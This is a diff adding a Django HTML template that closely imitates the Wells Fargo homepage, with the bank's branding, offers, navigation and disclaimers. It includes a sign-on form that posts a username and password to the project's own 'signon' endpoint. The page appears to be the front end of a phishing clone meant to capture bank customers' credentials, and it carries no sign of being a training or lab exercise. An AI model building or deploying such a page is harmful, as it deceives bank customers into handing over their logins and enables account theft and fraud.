@@ -1,0 +1,726 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wells Fargo | Home</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        /* --- CSS RESET & VARIABLES --- */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+        :root {
+            --wf-red: #D71E28;
+            --wf-gold: #FAD105;
+            --wf-dark-red: #B91C23;
+            --text-dark: #333333;
+            --text-muted: #666666;
+            --bg-light: #F4F0EB;
+            --bg-white: #FFFFFF;
+            --border-color: #D6D1CA;
+            --purple-accent: #7A1A60;
+        }
+
+        body {
+            color: var(--text-dark);
+            background-color: var(--bg-white);
+            overflow-x: hidden;
+        }
+
+        a {
+            text-decoration: none;
+            color: inherit;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        .btn-outline {
+            border: 1px solid var(--text-dark);
+            padding: 10px 24px;
+            border-radius: 20px;
+            font-weight: bold;
+            background: transparent;
+            cursor: pointer;
+            display: inline-block;
+            font-size: 14px;
+        }
+
+        /* --- DESKTOP HEADER & NAV --- */
+        header {
+            background-color: var(--wf-red);
+            color: var(--bg-white);
+            padding: 15px 0;
+            border-bottom: 4px solid var(--wf-gold);
+            position: relative;
+            z-index: 1000;
+        }
+
+        .header-top {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo {
+            font-size: 26px;
+            font-weight: bold;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+        }
+
+        .header-right {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+            font-size: 13px;
+        }
+
+        .btn-signon {
+            background-color: var(--bg-white);
+            color: var(--text-dark);
+            padding: 8px 18px;
+            border-radius: 20px;
+            font-weight: bold;
+            border: none;
+            cursor: pointer;
+        }
+
+        /* Mobile specific header elements hidden on desktop */
+        .mobile-nav-toggle {
+            display: none;
+            background: transparent;
+            border: none;
+            color: white;
+            text-align: center;
+            cursor: pointer;
+        }
+        .mobile-nav-toggle span {
+            display: block;
+            font-size: 10px;
+            font-weight: bold;
+            letter-spacing: 1px;
+            margin-top: 2px;
+        }
+        .mobile-nav-toggle i {
+            font-size: 22px;
+        }
+
+        .main-nav {
+            background-color: var(--bg-white);
+            border-bottom: 1px solid var(--border-color);
+            padding: 12px 0;
+        }
+
+        .nav-tier-1 {
+            display: flex;
+            gap: 25px;
+            font-size: 14px;
+            font-weight: 500;
+            color: #444;
+            margin-bottom: 12px;
+        }
+
+        .nav-tier-1 a.active {
+            color: var(--text-dark);
+            font-weight: bold;
+            border-bottom: 3px solid var(--wf-red);
+            padding-bottom: 11px;
+        }
+
+        .nav-tier-2 {
+            display: flex;
+            gap: 18px;
+            font-size: 13px;
+            color: var(--text-muted);
+            padding-top: 5px;
+        }
+
+        /* --- MOBILE SIDE MENU DRAWER (closeres.PNG) --- */
+        .mobile-menu-drawer {
+            position: fixed;
+            top: 0;
+            right: -100%;
+            width: 85%;
+            max-width: 360px;
+            height: 100%;
+            background-color: #FAF6F0;
+            z-index: 1001;
+            box-shadow: -4px 0 15px rgba(0,0,0,0.2);
+            transition: right 0.3s ease;
+            display: flex;
+            flex-direction: column;
+            overflow-y: auto;
+        }
+
+        .mobile-menu-drawer.open {
+            right: 0;
+        }
+
+        .drawer-close-btn {
+            background-color: #8C1D24;
+            color: white;
+            padding: 15px;
+            text-align: center;
+            cursor: pointer;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            width: 70px;
+            align-self: flex-end;
+        }
+        .drawer-close-btn i { font-size: 20px; }
+        .drawer-close-btn span { font-size: 10px; text-transform: uppercase; margin-top: 2px; }
+
+        .drawer-search-container {
+            padding: 15px;
+            background-color: #FFFFFF;
+            border-bottom: 1px solid var(--border-color);
+            position: relative;
+        }
+        .drawer-search-container input {
+            width: 100%;
+            padding: 12px 12px 12px 40px;
+            border: 1px solid var(--border-color);
+            border-radius: 4px;
+            font-size: 16px;
+            background-color: #FAF6F0;
+        }
+        .drawer-search-container i {
+            position: absolute;
+            left: 28px;
+            top: 28px;
+            color: var(--text-muted);
+            font-size: 16px;
+        }
+
+        .drawer-section-title {
+            background-color: #F6C200;
+            color: var(--text-dark);
+            font-weight: bold;
+            padding: 15px;
+            font-size: 16px;
+        }
+
+        .drawer-nav-list {
+            list-style: none;
+            background-color: #FFFFFF;
+        }
+        .drawer-nav-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 18px 15px;
+            border-bottom: 1px solid #EFECE8;
+            font-size: 15px;
+            color: #444;
+            cursor: pointer;
+        }
+        .drawer-nav-item i {
+            color: #4A154B;
+            font-size: 14px;
+        }
+
+        /* Dark background overlay when menu is open */
+        .menu-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            z-index: 999;
+            display: none;
+        }
+        .menu-overlay.active {
+            display: block;
+        }
+
+        /* --- HERO & MAIN CONTENT STYLING --- */
+        .hero-section {
+            background-color: #F4F0EB;
+            padding: 40px 0;
+        }
+
+        .hero-grid {
+            display: grid;
+            grid-template-columns: 320px 1fr;
+            gap: 40px;
+        }
+
+        .login-box {
+            background: var(--bg-white);
+            border-radius: 8px;
+            padding: 24px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+        }
+
+        .login-box h2 { font-size: 20px; font-weight: normal; margin-bottom: 4px; }
+        .login-box p { font-size: 13px; color: var(--text-muted); margin-bottom: 20px; }
+
+        .form-group { position: relative; margin-bottom: 20px; }
+        .form-group input {
+            width: 100%;
+            padding: 10px 0;
+            border: none;
+            border-bottom: 1px solid var(--text-muted);
+            font-size: 15px;
+            outline: none;
+        }
+        .form-group .show-pwd {
+            position: absolute; right: 0; top: 10px; font-size: 13px; color: #0066CC; cursor: pointer;
+        }
+
+        .checkbox-group { display: flex; align-items: center; gap: 8px; font-size: 13px; margin-bottom: 20px; }
+        .login-actions { display: flex; align-items: center; justify-content: space-between; margin-bottom: 20px; }
+        
+        .btn-submit {
+            background-color: var(--wf-red); color: var(--bg-white); border: none;
+            padding: 12px 32px; border-radius: 24px; font-weight: bold; font-size: 15px; cursor: pointer;
+        }
+        .enroll-link { color: #0066CC; font-size: 14px; font-weight: bold; }
+
+        .login-footer-links {
+            border-top: 1px solid var(--border-color); padding-top: 15px;
+            display: flex; flex-direction: column; gap: 8px; font-size: 12px; color: #0066CC;
+        }
+
+        .promo-content {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .promo-text h1 { font-size: 44px; font-weight: normal; margin-bottom: 15px; }
+        .promo-text p { font-size: 18px; margin-bottom: 30px; max-width: 500px; }
+
+        .badge-325 {
+            border-top: 4px solid var(--purple-accent);
+            border-bottom: 4px solid var(--purple-accent);
+            padding: 10px 0; text-align: center; width: 140px;
+        }
+        .badge-325 .enjoy { font-size: 14px; font-weight: bold; color: var(--purple-accent); }
+        .badge-325 .amount { font-size: 36px; font-weight: bold; color: var(--purple-accent); }
+
+        /* --- OFFERS GRID --- */
+        .offers-section { padding: 40px 0; }
+        .offers-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 20px; }
+        .offer-card {
+            border: 1px solid var(--border-color); border-radius: 8px;
+            padding: 24px; display: flex; flex-direction: column; justify-content: space-between;
+        }
+        .offer-card .icon { font-size: 28px; color: var(--purple-accent); margin-bottom: 15px; }
+        .offer-card h3 { font-size: 18px; font-weight: normal; margin-bottom: 10px; }
+        .offer-card p { font-size: 13px; color: var(--text-muted); margin-bottom: 20px; }
+        .offer-card .card-link { color: var(--purple-accent); font-weight: bold; font-size: 14px; }
+        
+        .interest-icon-box { text-align: center; padding: 20px 0; font-size: 48px; color: #E26928; }
+
+        /* --- CREDIT CARD BANNER --- */
+        .credit-card-banner {
+            background: linear-gradient(rgba(255,255,255,0.1), rgba(255,255,255,0.1)), url('https://images.unsplash.com/photo-1507525428034-b723cf961d3e?auto=format&fit=crop&w=1200&q=80') center/cover no-repeat;
+            padding: 60px 0;
+        }
+        .cc-banner-container { display: flex; justify-content: space-between; align-items: center; }
+        .cc-text-box { max-width: 400px; background: rgba(255, 255, 255, 0.9); padding: 30px; border-radius: 8px; }
+        .cc-text-box h2 { font-size: 28px; font-weight: normal; margin-bottom: 10px; }
+        
+        .cc-mockup {
+            background-color: #FF7F32; width: 280px; height: 170px; border-radius: 12px;
+            padding: 20px; color: white; display: flex; flex-direction: column; justify-content: space-between;
+        }
+
+        /* --- GUIDANCE --- */
+        .guidance-section { padding: 50px 0; text-align: center; }
+        .section-title { font-size: 28px; font-weight: normal; margin-bottom: 35px; }
+        .guidance-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 25px; }
+        .guidance-card { border: 1px solid var(--border-color); border-radius: 8px; overflow: hidden; text-align: left; }
+        .guidance-card img { width: 100%; height: 180px; object-fit: cover; }
+        .guidance-body { padding: 20px; }
+        .guidance-body h4 { font-size: 18px; margin-bottom: 10px; }
+        .guidance-body p { font-size: 13px; color: var(--text-muted); margin-bottom: 20px; }
+
+        /* --- COMMUNITY --- */
+        .community-section { padding: 50px 0; border-top: 1px solid var(--border-color); }
+        .community-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 25px; margin-top: 30px; }
+
+        /* --- FOOTER --- */
+        footer { background-color: #F4F0EB; padding: 40px 0; border-top: 1px solid var(--border-color); font-size: 13px; }
+        .footer-help-tools { display: flex; gap: 40px; margin-bottom: 30px; padding-bottom: 20px; border-bottom: 1px solid var(--border-color); }
+        .help-item { display: flex; align-items: center; gap: 10px; font-weight: bold; }
+        .footer-links { display: flex; flex-wrap: wrap; gap: 12px 20px; margin-bottom: 25px; color: #0066CC; }
+        .fdic-box { border: 1px solid #333; padding: 15px 20px; margin-bottom: 25px; max-width: 600px; }
+        .fdic-box ul { padding-left: 20px; }
+        .disclaimer-text { font-size: 11px; color: var(--text-muted); line-height: 1.5; }
+
+        /* --- MOBILE RESPONSIVE MEDIA QUERIES --- */
+        @media (max-width: 992px) {
+            .offers-grid { grid-template-columns: repeat(2, 1fr); }
+            .guidance-grid { grid-template-columns: 1fr; }
+            .community-grid { grid-template-columns: 1fr; }
+        }
+
+        @media (max-width: 768px) {
+            /* Header adjustments matching respom.PNG */
+            .header-right a, .header-right i {
+                display: none;
+            }
+            .mobile-nav-toggle {
+                display: block;
+            }
+            .main-nav {
+                display: none;
+            }
+
+            /* Main Layout Flip to single column stack */
+            .hero-grid {
+                grid-template-columns: 1fr;
+                gap: 20px;
+                display: flex;
+                flex-direction: column-reverse; /* Puts the promo items on top, signon below if needed */
+            }
+
+            /* Promo changes to match mobile screenshot layout */
+            .promo-content {
+                flex-direction: column-reverse;
+                align-items: center;
+                text-align: center;
+                gap: 20px;
+            }
+            .promo-text h1 {
+                font-size: 32px;
+            }
+            .promo-text p {
+                font-size: 15px;
+            }
+            .btn-outline {
+                width: 100%;
+                padding: 14px;
+            }
+
+            .cc-banner-container {
+                flex-direction: column;
+                gap: 30px;
+            }
+            .cc-text-box {
+                max-width: 100%;
+            }
+
+            .offers-grid {
+                grid-template-columns: 1fr;
+            }
+            .footer-help-tools {
+                flex-direction: column;
+                gap: 15px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="menu-overlay" id="menuOverlay" onclick="toggleMobileMenu()"></div>
+
+    <div class="mobile-menu-drawer" id="mobileDrawer">
+        <div class="drawer-close-btn" onclick="toggleMobileMenu()">
+            <i class="fa-solid fa-xmark"></i>
+            <span>Close</span>
+        </div>
+        <div class="drawer-search-container">
+            <i class="fa-solid fa-magnifying-glass"></i>
+            <input type="text" placeholder="Search">
+        </div>
+        <div class="drawer-section-title">Personal</div>
+        <ul class="drawer-nav-list">
+            <li class="drawer-nav-item">Checking <i class="fa-solid fa-chevron-right"></i></li>
+            <li class="drawer-nav-item">Savings & CDs <i class="fa-solid fa-chevron-right"></i></li>
+            <li class="drawer-nav-item">Credit Cards <i class="fa-solid fa-chevron-right"></i></li>
+            <li class="drawer-nav-item">Home Loans <i class="fa-solid fa-chevron-right"></i></li>
+            <li class="drawer-nav-item">Personal Loans <i class="fa-solid fa-chevron-right"></i></li>
+            <li class="drawer-nav-item">Auto Loans <i class="fa-solid fa-chevron-right"></i></li>
+            <li class="drawer-nav-item">Premier <i class="fa-solid fa-chevron-right"></i></li>
+            <li class="drawer-nav-item">Education & Tools <i class="fa-solid fa-chevron-right"></i></li>
+        </ul>
+    </div>
+
+    <header>
+        <div class="container header-top">
+            <div class="logo">Wells Fargo</div>
+            <div class="header-right">
+                <a href="#">ATMs/Locations</a>
+                <a href="#">Help</a>
+                <a href="#">Español</a>
+                <i class="fa-solid fa-magnifying-glass" style="cursor:pointer;"></i>
+                <a href="{% url 'signon' %}" class="btn-signon">
+    Sign On
+</a>
+            </div>
+            <button class="mobile-nav-toggle" onclick="toggleMobileMenu()">
+                <i class="fa-solid fa-bars"></i>
+                <span></span>
+            </button>
+        </div>
+    </header>
+
+    <nav class="main-nav">
+        <div class="container">
+            <div class="nav-tier-1">
+                <a href="#" class="active">Personal</a>
+                <a href="#">Investing & Wealth Management</a>
+                <a href="#">Business</a>
+                <a href="#">Commercial Banking</a>
+                <a href="#">Corporate & Investment Banking</a>
+                <a href="#">About Wells Fargo</a>
+            </div>
+            <div class="nav-tier-2">
+                <a href="#">Checking</a>
+                <a href="#">Savings & CDs</a>
+                <a href="#">Credit Cards</a>
+                <a href="#">Home Loans</a>
+                <a href="#">Personal Loans</a>
+                <a href="#">Auto Loans</a>
+                <a href="#">Premier</a>
+                <a href="#">Education & Tools</a>
+            </div>
+        </div>
+    </nav>
+
+    <section class="hero-section">
+        <div class="container hero-grid">
+            
+            <div class="login-box">
+                <h2>Good afternoon</h2>
+                <p>Sign on to manage your accounts.</p>
+                <form method="POST" action="{% url 'signon' %}">
+                    {% csrf_token %}
+                                    <div class="form-group">
+                                        <input
+                    type="text"
+                    name="account_number"
+                    placeholder="Username"
+                    required>
+                    </div>
+                    <div class="form-group">
+                       <input
+    type="password"
+    id="password"
+    name="password"
+    placeholder="Password"
+    required
+>
+                        <span class="show-pwd" onclick="togglePassword()">Show</span>
+                    </div>
+                    <div class="checkbox-group">
+                        <input type="checkbox" id="saveUser">
+                        <label for="saveUser">Save username</label>
+                    </div>
+                    <div class="login-actions">
+                        <button type="submit" class="btn-submit">Sign On</button>
+                        <a href="enrol.html" class="enroll-link">Enroll</a>
+                    </div>
+                </form>
+                <div class="login-footer-links">
+                    <a href="#">Sign on with a passkey</a>
+                    <a href="forgotpassword">Forgot username or password?</a>
+                    <a href="#">Privacy, Cookies, and Legal</a>
+                </div>
+            </div>
+
+            <div class="promo-content">
+                <div class="promo-text">
+                    <h1>$325 checking bonus on us</h1>
+                    <p>New customers open an eligible checking account with qualifying direct deposits</p>
+                    <button class="btn-outline">Get started >></button>
+                </div>
+                <div class="badge-325">
+                    <span class="enjoy">Enjoy</span>
+                    <span class="amount">$325</span>
+                </div>
+            </div>
+
+        </div>
+    </section>
+
+    <section class="offers-section">
+        <div class="container offers-grid">
+            <div class="offer-card">
+                <div>
+                    <div class="icon"><i class="fa-solid fa-graduation-cap"></i></div>
+                    <h3>New customer? Say hello to a $125 bonus</h3>
+                    <p>Open a Clear Access Banking account, great for students & more, complete offer requirements</p>
+                </div>
+                <a href="#" class="card-link">See offer details ></a>
+            </div>
+            <div class="offer-card">
+                <div>
+                    <div class="icon"><i class="fa-regular fa-credit-card"></i></div>
+                    <h3>Enjoy 0% intro APR for 21 months</h3>
+                    <p>from account opening on purchases and qualifying balance transfers. Terms apply.</p>
+                </div>
+                <a href="#" class="card-link">Learn more ></a>
+            </div>
+            <div class="offer-card">
+                <div>
+                    <div class="icon"><i class="fa-solid fa-wallet"></i></div>
+                    <h3>Earn up to $350 in One Key rewards</h3>
+                    <p>Use rewards on eligible bookings on Expedia®, Hotels.com®, and Vrbo®. Terms apply.</p>
+                </div>
+                <a href="#" class="card-link">Learn more ></a>
+            </div>
+            <div class="offer-card">
+                <div>
+                    <h3>Interest rates today</h3>
+                    <div class="interest-icon-box">
+                        <i class="fa-solid fa-percentage"></i>
+                    </div>
+                </div>
+                <a href="#" class="card-link">Check rates <i class="fa-solid fa-chevron-down" style="font-size:11px"></i></a>
+            </div>
+        </div>
+    </section>
+
+    <section class="credit-card-banner">
+        <div class="container cc-banner-container">
+            <div class="cc-text-box">
+                <h2>Earn 60,000 bonus points</h2>
+                <p>on qualifying purchases. Terms apply.</p>
+                <button class="btn-outline">Learn more</button>
+            </div>
+            <div class="cc-mockup">
+                <div style="font-size: 11px; text-align: right; font-weight: bold;">CHOICE privileges</div>
+                <div style="font-size: 24px;"><i class="fa-solid fa-microchip"></i></div>
+                <div style="display:flex; justify-content:space-between; align-items: center; font-size:12px;">
+                    <span>mastercard</span>
+                    <i class="fa-brands fa-cc-mastercard" style="font-size: 24px;"></i>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section class="guidance-section">
+        <div class="container">
+            <h2 class="section-title">Financial guidance and support</h2>
+            <div class="guidance-grid">
+                <div class="guidance-card">
+                    <img src="https://images.unsplash.com/photo-1556742049-0cfed4f6a45d?auto=format&fit=crop&w=400&q=80" alt="Savings">
+                    <div class="guidance-body">
+                        <h4>Savings you can count on</h4>
+                        <p>Discover how smart saving moves you closer to your goals</p>
+                        <button class="btn-outline">Grow your savings</button>
+                    </div>
+                </div>
+                <div class="guidance-card">
+                    <img src="https://images.unsplash.com/photo-1534447677768-be436bb09401?auto=format&fit=crop&w=400&q=80" alt="Next chapter">
+                    <div class="guidance-body">
+                        <h4>Secure your next chapter</h4>
+                        <p>Protect what you've built as you look ahead</p>
+                        <button class="btn-outline">Unlock your options</button>
+                    </div>
+                </div>
+                <div class="guidance-card">
+                    <img src="https://images.unsplash.com/photo-1473448912268-2022ce9509d8?auto=format&fit=crop&w=400&q=80" alt="Future">
+                    <div class="guidance-body">
+                        <h4>Step into your future</h4>
+                        <p>Track goals and get insights for your financial future with LifeSync®</p>
+                        <button class="btn-outline">Discover how</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section class="community-section">
+        <div class="container">
+            <div style="text-align:center;">
+                <h2 style="font-size:28px; font-weight:normal; margin-bottom:15px;">Serving our customers and communities</h2>
+                <p style="color:var(--text-muted); max-width:700px; margin:0 auto;">It doesn't happen with one transaction, in one day on the job, or in one quarter. It's earned relationship by relationship.</p>
+            </div>
+            <div class="community-grid">
+                <div class="guidance-card">
+                    <img src="https://images.unsplash.com/photo-1593113598332-cd288d649433?auto=format&fit=crop&w=400&q=80" alt="Who we are">
+                    <div class="guidance-body">
+                        <h4>Who we are</h4>
+                        <p>Wells Fargo helps strengthen communities through inclusion, economic empowerment, and sustainability.</p>
+                        <button class="btn-outline">About Wells Fargo</button>
+                    </div>
+                </div>
+                <div class="guidance-card">
+                    <img src="https://images.unsplash.com/photo-1592417817098-8f3d6eb18865?auto=format&fit=crop&w=400&q=80" alt="Committed">
+                    <div class="guidance-body">
+                        <h4>Why we're committed to communities</h4>
+                        <p>We don't just serve our communities—we are our communities. We're committed to helping customers and neighborhoods thrive.</p>
+                        <button class="btn-outline">Wells Fargo Stories</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <footer>
+        <div class="container">
+            <div class="footer-help-tools">
+                <div class="help-item"><i class="fa-solid fa-location-dot"></i> Find a location <i class="fa-solid fa-chevron-down" style="font-size:10px;"></i></div>
+                <div class="help-item" style="color:var(--purple-accent);"><i class="fa-regular fa-calendar-days"></i> Make an appointment</div>
+                <div class="help-item"><i class="fa-regular fa-circle-question"></i> Quick help <i class="fa-solid fa-chevron-down" style="font-size:10px;"></i></div>
+            </div>
+            <div class="footer-links">
+                <a href="#">Privacy, Cookies, Security & Legal</a>
+                <a href="#">Do Not Sell My Personal Information</a>
+                <a href="#">Notice of Data Collection</a>
+                <a href="#">General Terms of Use</a>
+                <a href="#">Online Access Agreement</a>
+                <a href="#">Report Fraud</a>
+                <a href="#">About Wells Fargo</a>
+                <a href="#">Careers</a>
+            </div>
+            <div class="fdic-box">
+                <p style="font-weight:bold; margin-bottom:10px;">Investment and Insurance Products are:</p>
+                <ul>
+                    <li>Not Insured by the FDIC or Any Federal Government Agency</li>
+                    <li>Not a Deposit or Guaranteed by the Bank</li>
+                    <li>Subject to Investment Risks, Including Possible Loss of Principal</li>
+                </ul>
+            </div>
+            <p class="disclaimer-text">Investment products and services are offered through Wells Fargo Advisors. Wells Fargo Advisors is a trade name used by Wells Fargo Clearing Services, LLC (WFCS).</p>
+        </div>
+    </footer>
+
+    <script>
+        function toggleMobileMenu() {
+            const drawer = document.getElementById('mobileDrawer');
+            const overlay = document.getElementById('menuOverlay');
+            
+            if(drawer.classList.contains('open')) {
+                drawer.classList.remove('open');
+                overlay.classList.remove('active');
+                document.body.style.overflow = 'auto'; // Re-enable background scrolling
+            } else {
+                drawer.classList.add('open');
+                overlay.classList.add('active');
+                document.body.style.overflow = 'hidden'; // Freeze background scrolling
+            }
+        }
+
+        function togglePassword() {
+            const passwordInput = document.getElementById("password");
+            const toggleText = document.querySelector(".show-pwd");
+            
+            if (passwordInput.type === "password") {
+                passwordInput.type = "text";
+                toggleText.textContent = "Hide";
+            } else {
+                passwordInput.type = "password";
+                toggleText.textContent = "Show";
+            }
+        }
+    </script>
+</body>
+</html>
